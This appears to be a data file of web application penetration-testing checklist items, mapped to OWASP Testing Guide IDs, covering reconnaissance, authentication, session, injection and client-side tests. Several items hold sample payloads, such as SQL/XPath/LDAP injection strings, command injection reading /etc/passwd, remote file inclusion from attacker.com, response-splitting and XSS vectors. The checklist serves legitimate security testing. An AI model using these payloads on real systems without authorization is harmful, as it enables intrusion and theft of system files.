items.title: Conduct Search Engine Discovery and Reconnaissance for Information Leakage
items.caption: OTG-INFO-001, WAHHM - Recon and Analysis
items.description: Use a search engine to search for Network diagrams and Configurations, Credentials, Error message content.
items.tools: Google Hacking, Sitedigger, Shodan, FOCA, Punkspider

items.title: Fingerprint Web Server
items.caption: OTG-INFO-002, WAHHM - Recon and Analysis
items.description: Find the version and type of a running web server to determine known vulnerabilities and the appropriate exploits. Using 'HTTP header field ordering' and 'Malformed requests test.'

items.title: Review Webserver Metafiles for Information Leakage
items.caption: OTG-INFO-003, WAHHM - Recon and Analysis
items.description: Analyze robots.txt and identify <META> Tags from website.

items.title: Enumerate Applications on Webserver
items.caption: if in scope OTG-INFO-004, WAHHM - Recon and Analysis
items.description: Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers
items.tools: Webhosting.info, dnsrecon, Nmap, fierce, Recon-ng, Intrigue

items.title: Review Webpage Comments and Metadata for Information Leakage
items.caption: OTG-INFO-005, WAHHM - Recon and Analysis
items.description: Find sensitive information from webpage comments and Metadata on source code.

items.title: Identify application entry points
items.caption: OTG-INFO-006, WAHHM - Recon and Analysis
items.description: Identify from hidden fields, parameters, methods HTTP header analysis

items.title: Map execution paths through application
items.caption: OTG-INFO-007, WAHHM - Recon and Analysis
items.description: Map the target application and understand the principal workflows.

items.title: Fingerprint Web Application Framework
items.caption: OTG-INFO-008, WAHHM - Recon and Analysis
items.description: Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders.

items.title: Fingerprint Web Application
items.caption: OTG-INFO-009, WAHHM - Recon and Analysis
items.description: Identify the web application and version to determine known vulnerabilities and the appropriate exploits.

items.title: Map Application Architecture
items.caption: OTG-INFO-010, WAHHM - Recon and Analysis
items.description: Identify application architecture including Web language, WAF, Reverse proxy, Application Server, Backend Database

items.title: Test Network/Infrastructure Configuration
items.caption: OTG-CONFIG-001, WAHHM - Recon and Analysis, Assess Application Hosting
items.description: Understand the infrastructure elements interactions, config management for software, backend DB server, WebDAV, FTP in order to identify known vulnerabilities.

items.title: Test Application Platform Configuration
items.caption: OTG-CONFIG-002, WAHHM - Recon and Analysis
items.description: Identify default installation file/directory, Handle Server errors (40*,50*), Minimal Privilege, Software logging.

items.title: Test File Extensions Handling for Sensitive Information
items.caption: OTG-CONFIG-003, WAHHM - Recon and Analysis
items.description: Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)

items.title: Backup and Unreferenced Files for Sensitive Information
items.caption: OTG-CONFIG-004, WAHHM - Recon and Analysis
items.description: Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename

items.title: Enumerate Infrastructure and Application Admin Interfaces
items.caption: OTG-CONFIG-005, WAHHM - Recon and Analysis
items.description: Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)
items.tools: Burp Proxy, dirb, Dirbuster, fuzzdb, Tilde Scanner

items.title: Test HTTP Methods
items.caption: OTG-CONFIG-006, WAHHM - Test Handling of Access
items.description: Identify HTTP allowed methods on Web server with OPTIONS. Arbitrary HTTP Methods, HEAD access control bypass and XST

items.title: Test HTTP Strict Transport Security
items.caption: OTG-CONFIG-007, WAHHM - Test Handling of Access
items.description: Identify HSTS header on Web server through HTTP response header. curl -s -D- https://domain.com/ | grep Strict

items.title: Test RIA cross domain policy
items.caption: OTG-CONFIG-008, WAHHM - Test Handling of Access
items.description: Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.

items.title: Test Role Definitions
items.caption: OTG-IDENT-001, WAHHM - Test Handling of Access
items.description: Validate the system roles defined within the application by creating a permission matrix.

items.title: Test User Registration Process
items.caption: OTG-IDENT-002, WAHHM - Test Handling of Access
items.description: Verify that the identity requirements for user registration are aligned with business and security requirements

items.title: Test Account Provisioning Process
items.caption: OTG-IDENT-003, WAHHM - Test Handling of Access
items.description: Determine which roles are able to provision users and what sort of accounts they can provision.

items.title: Testing for Account Enumeration and Guessable User Account
items.caption: OTG-IDENT-004, WAHHM - Test Handling of Access
items.description: Generic login error statement check, return codes/parameter values, enumerate all possible valid user ids (Login system, Forgot password)

items.title: Testing for Weak or unenforced username policy
items.caption: OTG-IDENT-005, WAHHM - Test Handling of Access
items.description: User account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.

items.title: Test Permissions of Guest/Training Accounts
items.caption: OTG-IDENT-006, WAHHM - Test Handling of Access
items.description: Guest and Training accounts are useful ways to acquaint potential users with system functionality prior to them completing the authorization process required for access. Evaluate consistency between access policy and guest/training account access permissions.

items.title: Test Account Suspension/Resumption Process
items.caption: OTG-IDENT-007, WAHHM - Test Handling of Access
items.description: Verify the identity requirements for user registration align with business/security requirements. Validate the registration process.

items.title: Testing for Credentials Transported over an Encrypted Channel
items.caption: OTG-AUTHN-001, WAHHM - Miscellaneous Tests
items.description: Check the referrer whether it’s HTTP or HTTPs. Sending data through HTTP and HTTPS.

items.title: Testing for default credentials
items.caption: OTG-AUTHN-002, WAHHM - Test Handling of Access
items.description: Testing for default credentials of common applications, Testing for default password of new accounts.

items.title: Testing for Weak lock out mechanism
items.caption: OTG-AUTHN-003, WAHHM - Test Handling of Access
items.description: Evaluate the account lockout mechanism’s ability to mitigate brute force password guessing. Evaluate the unlock mechanism’s resistance to unauthorized account unlocking.

items.title: Testing for bypassing authentication schema
items.caption: OTG-AUTHN-004, WAHHM - Test Handling of Access
items.description: Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection

items.title: Test remember password functionality
items.caption: OTG-AUTHN-005, WAHHM - Test Handling of Access
items.description: Look for passwords being stored in a cookie. Examine the cookies stored by the application. Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?

items.title: Testing for Browser cache weakness
items.caption: OTG-AUTHN-006, WAHHM - Miscellaneous Tests
items.description: Check browser history issues by clicking the 'Back' button after logging out. Check browser cache issue from HTTP response headers (Cache-Control: no-cache)
items.tools: Burp Proxy, ZAP, Firefox add-on CacheViewer2

items.title: Testing for Weak password policy
items.caption: OTG-AUTHN-007, WAHHM - Test Handling of Access
items.description: Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse and aging requirements of Passwords.

items.title: Testing for Weak security question/answer
items.caption: OTG-AUTHN-008, WAHHM - Test Handling of Access
items.description: Testing for weak pre-generated questions, Testing for weak self-generated questions, Testing for brute-forcible answers (Unlimited attempts?)

items.title: Testing for weak password change or reset functionalities
items.caption: OTG-AUTHN-009, WAHHM - Test Handling of Access
items.description: Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?), Test password change (Need old password?), CSRF vulnerability ?

items.title: Testing for Weaker authentication in alternative channel
items.caption: OTG-AUTHN-010, WAHHM - Test Handling of Access
items.description: Understand the primary mechanism and Identify other channels (Mobile App, Call center, SSO)

items.title: Testing Directory traversal/file include
items.caption: OTG-AUTHZ-001, WAHHM - Test Handling of Input
items.description: dot-dot-slash attack (../), Directory traversal, Local File inclusion/Remote File Inclusion.

items.title: Testing for bypassing authorization schema
items.caption: OTG-AUTHZ-002, WAHHM - Test Handling of Access
items.description: Access a resource without authentication?, Bypass ACL, Force browsing (/admin/adduser.jsp)

items.title: Testing for Privilege Escalation
items.caption: OTG-AUTHZ-003, WAHHM - Test Handling of Access
items.description: Testing for role/privilege manipulates the values of hidden variables. Change some param groupid=2 to groupid=1

items.title: Testing for Insecure Direct Object References
items.caption: OTG-AUTHZ-004, WAHHM - Test Handling of Access
items.description: Force changing parameter value (?invoice=123 -> ?invoice=456)

items.title: Testing for Bypassing Session Management Schema
items.caption: OTG-SESS-001, WAHHM - Test Handling of Access
items.description: SessionID analysis prediction, unencrypted cookie transport, brute-force.

items.title: Testing for Cookies attributes
items.caption: OTG-SESS-002, WAHHM - Test Handling of Access
items.description: Check HTTPOnly and Secure flag expiration, inspect for sensitive data.

items.title: Testing for Session Fixation
items.caption: OTG-SESS-003, WAHHM - Test Handling of Access
items.description: The application doesn't renew the cookie after a successful user authentication.

items.title: Testing for Exposed Session Variables
items.caption: OTG-SESS-004, WAHHM - Test Handling of Access
items.description: Encryption & Reuse of session Tokens vulnerabilities, Send sessionID with GET method ?

items.title: Testing for Cross Site Request Forgery
items.caption: OTG-SESS-005, WAHHM - Test Handling of Access
items.description: URL analysis, Direct access to functions without any token.

items.title: Testing for logout functionality
items.caption: OTG-SESS-006, WAHHM - Test Handling of Access
items.description: Check reuse session after logout both server-side and SSO.

items.title: Test Session Timeout
items.caption: OTG-SESS-007, WAHHM - Test Handling of Access
items.description: Check session timeout, after the timeout has passed, all session tokens should be destroyed or be unusable.

items.title: Testing for Session puzzling
items.caption: OTG-SESS-008, WAHHM - Test Handling of Access
items.description: The application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.

items.title: Testing for Reflected Cross Site Scripting
items.caption: OTG-INPVAL-001, WAHHM - Test Handling of Input
items.description: Check for input validation, Replace the vector used to identify XSS, XSS with HTTP Parameter Pollution.

items.title: Testing for Stored Cross Site Scripting
items.caption: OTG-INPVAL-002, WAHHM - Test Handling of Input
items.description: Check input forms/Upload forms and analyze HTML codes, Leverage XSS with BeEF
items.tools: Burp Proxy, ZAP, BeEF, XSS Proxy

items.title: Testing for HTTP Verb Tampering
items.caption: OTG-INPVAL-003, WAHHM - Test Handling of Input
items.description: Craft custom HTTP requests to test the other methods to bypass URL authentication and authorization.

items.title: Testing for HTTP Parameter pollution
items.caption: OTG-INPVAL-004, WAHHM - Test Handling of Input
items.description: Identify any form or action that allows user-supplied input to bypass Input validation and filters using HPP

items.title: Testing for SQL Injection
items.caption: OTG-INPVAL-005, WAHHM - Test Handling of Input
items.description: Union, Boolean, Error based, Out-of-band, Time delay.

items.title: Oracle Testing
items.description: Identify URLs for PL/SQL web applications, Access with PL/SQL Packages, Bypass PL/SQL Exclusion list, SQL Injection

items.title: MySQL Testing
items.description: Identify MySQL version, Single quote, Information_schema, Read/Write file.

items.title: SQL Server Testing
items.description: Comment operator (- -), Query separator (;), Stored procedures (xp_cmdshell)

items.title: Testing PostgreSQL
items.description: Determine that the backend database engine is PostgreSQL by using the :: cast operator. Read/Write file, Shell Injection (OS command)

items.title: MS Access Testing
items.description: Enumerate the column through error-based (Group by), Obtain database schema combine with fuzzdb.

items.title: Testing for NoSQL injection
items.description: dentify NoSQL databases, Pass special characters (' " \ ; { } ), Attack with reserved variable name, operator.

items.title: Testing for LDAP Injection
items.caption: OTG-INPVAL-006, WAHHM - Test Handling of Input
items.description: /ldapsearch?user=*user=*user=*)(uid=*))(|(uid=*pass=password

items.title: Testing for ORM Injection
items.caption: OTG-INPVAL-007, WAHHM - Test Handling of Input
items.description: Testing ORM injection is identical to SQL injection testing

items.title: Testing for XML Injection
items.caption: OTG-INPVAL-008, WAHHM - Test Handling of Input
items.description: Check with XML Meta Characters', " , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG

items.title: Testing for SSI Injection
items.caption: OTG-INPVAL-009, WAHHM - Test Handling of Input
items.description: Presence of .shtml extension, Check for these characters, < ! # = / . " - > and [a-zA-Z0-9], include String = <!--#include virtual='/etc/passwd'

items.title: Testing for XPath Injection
items.caption: OTG-INPVAL-010, WAHHM - Test Handling of Input
items.description:
Check for XML error enumeration by supplying a single quote (').
Username: ‘ or ‘1’ = ‘1
Password: ‘ or ‘1’ = ‘1

items.title: IMAP/SMTP Injection
items.caption: OTG-INPVAL-011, WAHHM - Test Handling of Input
items.description:
Identifying vulnerable parameters with special characters (i.e.: \, ‘, “, @, #, !, |).
Understanding the data flow and deployment structure of the client
IMAP/SMTP command injection (Header, Body, Footer)

items.title: Testing for Code Injection
items.caption: OTG-INPVAL-012, WAHHM - Test Handling of Input
items.description: Enter OS commands in the input field.?arg=1; system('id')

items.title: Testing for Local File Inclusion
items.description: LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource)

items.title: Testing for Remote File Inclusion
items.description: RFI from malicious URL ?page.php?file=http://attacker.com/malicious_page

items.title: Testing for Command Injection
items.caption: OTG-INPVAL-013, WAHHM - Test Handling of Input
items.description:
Understand the application platform, OS, folder structure, relative path and execute OS commands on a Web server.
%3Bcat%20/etc/passwd
test.pdf+|+Dir C:\

items.title: Testing for Buffer overflow
items.caption: OTG-INPVAL-014, WAHHM - Test Handling of Input
items.description:
Testing for heap overflow vulnerability
Testing for stack overflow vulnerability
Testing for format string vulnerability

items.title: Testing for incubated vulnerabilities
items.caption: OTG-INPVAL-015, WAHHM - Test Handling of Input
items.description: File Upload, Stored XSS , SQL/XPATH Injection, Misconfigured servers (Tomcat, Plesk, Cpanel)

items.title: Testing for HTTP Splitting/Smuggling
items.caption: OTG-INPVAL-016, WAHHM - Test Handling of Input
items.description: param=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>

items.title: Analysis of Error Codes
items.caption: OTG-ERR-001, WAHHM - Recon and Analysis
items.description: Locate error codes generated from applications or web servers. Collect sensitive information from that errors (Web Server, Application Server, Database)

items.title: Analysis of Stack Traces
items.caption: OTG-ERR-002, WAHHM - Recon and Analysis
items.description: Invalid Input / Empty inputs. Input that contains non alphanumeric characters or query syntax. Access to internal pages without authentication. Bypassing application flow.

items.title: Testing for Weak SSL/TSL Ciphers, Insufficient Transport Layer Protection
items.caption: OTG-CRYPST-001, WAHHM - Test Handling of Access
items.description: Identify SSL service, Identify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)

items.title: Testing for Padding Oracle
items.caption: OTG-CRYPST-002, WAHHM - Test Handling of Access
items.description:
Compare the responses in three different states:
Cipher text gets decrypted, resulting data is correct.
Cipher text gets decrypted, resulting data is garbled and causes some exception or error handling in the application logic.
Cipher text decryption fails due to padding errors.

items.title: Testing for Sensitive information sent via unencrypted channels
items.caption: OTG-CRYPST-003, WAHHM - Test Handling of Access
items.description:
Check sensitive data during the transmission:
Information used in authentication (e.g. Credentials, PINs, Session identifiers, Tokens, Cookies…)
Information protected by laws, regulations or specific organizational policy (e.g. Credit Cards, Customers data)

items.title: Test Business Logic Data Validation
items.caption: OTG-BUSLOGIC-001, WAHHM - Test for Logic Flaws
items.description:
Looking for data entry points or hand off points between systems or software.
Once found try to insert logically invalid data into the application/system.

items.title: Test Ability to Forge Requests
items.caption: OTG-BUSLOGIC-002, WAHHM - Test for Logic Flaws
items.description:
Looking for guessable, predictable or hidden functionality of fields.
Once found, try to insert logically valid data into the application/system allowing the user to go through the application/system against the normal business logic workflow.

items.title: Test Integrity Checks
items.caption: OTG-BUSLOGIC-003, WAHHM - Test for Logic Flaws
items.description:
Looking for parts of the application/system (components i.e. For example, input fields, databases or logs) that move, store or handle data/information.
For each identified component determine what type of data/information is logically acceptable and what types the application/system should guard against. Also, consider who according to the business logic is allowed to insert, update and delete data/information and in each component.
Attempt to insert, update or edit delete the data/information values with invalid data/information into each component (i.e. input, database, or log) by users that .should not be allowed per the business logic workflow.

items.title: Test for Process Timing
items.caption: OTG-BUSLOGIC-004, WAHHM - Test for Logic Flaws
items.description:
Looking for application/system functionality that may be impacted by time. Such as execution time or actions that help users predict a future outcome or allow one to circumvent any part of the business logic or workflow. For example, not completing transactions in an expected time.
Develop and execute the mis-use cases ensuring that attackers cannot gain an advantage based on any timing.

items.title: Test Number of Times a Function Can be Used Limits
items.caption: OTG-BUSLOGIC-005, WAHHM - Test for Logic Flaws
items.description:
Looking for functions or features in the application or system that should not be executed more than a single time or specified number of times during the business logic workflow.
For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times.

items.title: Testing for the Circumvention of Work Flows
items.caption: OTG-BUSLOGIC-006, WAHHM - Test for Logic Flaws
items.description:
Looking for methods to skip or go to steps in the application process in a different order from the designed/intended business logic flow.
For each method develop a misuse case and try to circumvent or perform an action that is 'not acceptable' per the business logic workflow.

items.title: Test Defenses Against Application Mis-use
items.caption: OTG-BUSLOGIC-007, WAHHM - Test for Logic Flaws
items.description:
Measures that might indicate the application has in-built self-defense:
Changed responses, Blocked requests, Actions that log a user out or lock their account

items.title: Test Upload of Unexpected File Types
items.caption: OTG-BUSLOGIC-008, WAHHM - Test for Logic Flaws
items.description:
Review the project documentation and perform some exploratory testing looking for file types that should be 'unsupported' by the application/system.
Try to upload these “unsupported” files and verify that they are properly rejected.
If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. PS. file.phtml, shell.phPWND, SHELL~1.PHP

items.title: Test Upload of Malicious Files
items.caption: OTG-BUSLOGIC-009, WAHHM - Test for Logic Flaws
items.description:
Develop or acquire a known “malicious” file.
Try to upload the malicious file to the application/system and verify that it is correctly rejected.
If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated.

items.title: Testing for DOM based Cross Site Scripting
items.caption: OTG-CLIENT-001, WAHHM -  Miscellaneous Tests
items.description: Test for the user inputs obtained from client-side JavaScript Objects

items.title: Testing for JavaScript Execution
items.caption: OTG-CLIENT-002, WAHHM - Test Handling of Input
items.description:
Inject JavaScript code:
www.victim.com/?javascript:alert(1)

items.title: Testing for HTML Injection
items.caption: OTG-CLIENT-003, WAHHM - Test Handling of Input
items.description:
Send malicious HTML code:
?user=<img%20src='aaa'%20onerror=alert(1)>

items.title: Testing for Client Side URL Redirect
items.caption: OTG-CLIENT-004, WAHHM - Test Handling of Input
items.description:
Modify untrusted URL input to a malicious site:
(Open Redirect)?redirect=www.fake-target.site

items.title: Testing for CSS Injection
items.caption: OTG-CLIENT-005, WAHHM - Test Handling of Input
items.description:
nject code in the CSS context :
www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera [8,12])
www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)

items.title: Testing for Client Side Resource Manipulation
items.caption: OTG-CLIENT-006, WAHHM - Test Handling of Input
items.description:
External JavaScript could be easily injected in the trusted web site
www.victim.com/#http://evil.com/js.js

items.title: Test Cross Origin Resource Sharing
items.caption: OTG-CLIENT-007, WAHHM -  Miscellaneous Tests
items.description: Check the HTTP headers in order to understand how CORS is used (Origin Header)

items.title: Testing for Cross Site Flashing
items.caption: OTG-CLIENT-008, WAHHM - Test Handling of Input
items.description: Decompile, Undefined variables, Unsafe methods, Include malicious SWF http://victim/file.swf?lang=http://evil
items.tools: FlashBang, Flare, Flasm, SWFScan, SWF Intruder

items.title: Testing for Clickjacking
items.caption: OTG-CLIENT-009, WAHHM -  Miscellaneous Tests
items.description: Discover if a website is vulnerable by loading into an iframe, create a simple web page that includes a frame containing the target.

items.title: Testing WebSockets
items.caption: OTG-CLIENT-010, WAHHM - Test Handling of Input
items.description:
Identify that the application is using WebSockets by inspecting ws:// or wss:// URI scheme.
Use Google Chrome's Developer Tools to view the Network WebSocket communication.
Check Origin, Confidentiality and Integrity, Authentication, Authorization, Input Sanitization
items.tools: Burp Proxy, Chrome, ZAP, WebSocket Client

items.title: Test Web Messaging
items.caption: OTG-CLIENT-011, WAHHM - Test Handling of Input
items.description: Analyse JavaScript code looking for how Web Messaging is implemented. How the website is restricting messages from untrusted domain and how the data is handled even for trusted domains

items.title: Test Local Storage
items.caption: OTG-CLIENT-012, WAHHM -  Miscellaneous Tests
items.description: Determine whether the website is storing sensitive data in the storage. XSS in localstorage http://server/StoragePOC.html#
